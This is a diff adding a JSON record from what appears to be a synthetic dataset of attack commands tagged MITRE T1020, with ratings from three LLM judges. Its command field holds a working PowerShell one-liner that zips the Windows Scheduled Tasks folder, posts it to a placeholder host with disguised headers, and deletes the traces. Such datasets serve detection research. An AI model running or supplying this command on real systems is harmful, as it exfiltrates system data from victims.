@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; $z=Join-Path $env:TEMP ('tasks_'+(Get-Date -Format yyyyMMddHHmmss)+'.zip'); Compress-Archive -Path 'C:\\Windows\\System32\\Tasks' -DestinationPath $z -Force; Invoke-WebRequest -Uri 'https://cdn.example.net/content/upload/tasks' -Method Post -InFile $z -ContentType 'application/zip' -Headers @{ 'User-Agent'='Mozilla/5.0'; 'Accept'='*/*' } -ErrorAction SilentlyContinue; Remove-Item $z -Force",
+  "explanation": "Packages the Scheduled Tasks directory and exfiltrates it over HTTPS POST to a remote endpoint.",
+  "rationale_steps": [
+    "Compress scheduled task definitions that reveal persistence and activity.",
+    "Send the archive via Invoke-WebRequest POST with a generic content type.",
+    "Suppress progress and clean up temporary artifacts."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-d552ecc6",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell one-liner has balanced quotes/parentheses, proper separators, valid cmdlets/parameters, and a correctly formed headers hashtable.",
+        "semantic_score": 5,
+        "semantic_justification": "It compresses the Scheduled Tasks directory, uploads the zip via HTTPS POST with Invoke-WebRequest, and deletes the file, matching automated exfiltration behavior assuming typical read access and egress.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:34:15.975087Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignments, cmdlet usage, parameter passing, balanced quotes/parentheses/braces, and appropriate semicolons separating commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1020 Automated Exfiltration technique by compressing the Windows Scheduled Tasks directory, exfiltrating it via HTTPS POST to a remote server with browser-like headers for evasion, and cleaning up the temporary file afterward.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:34:19.124052Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid PowerShell cmdlets, proper syntax for variables, date formatting, path joining, and cmdlet parameters with balanced quotes and parentheses.",
+        "semantic_score": 3,
+        "semantic_justification": "The command correctly uses PowerShell cmdlets to package and exfiltrate data via HTTP POST, aligning with T1020, but the target path 'C:\\Windows\\System32\\Tasks' typically requires elevated privileges to read completely, making its full operational success unlikely under the stated 'Privilege: None' constraint.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:47:05.120512Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
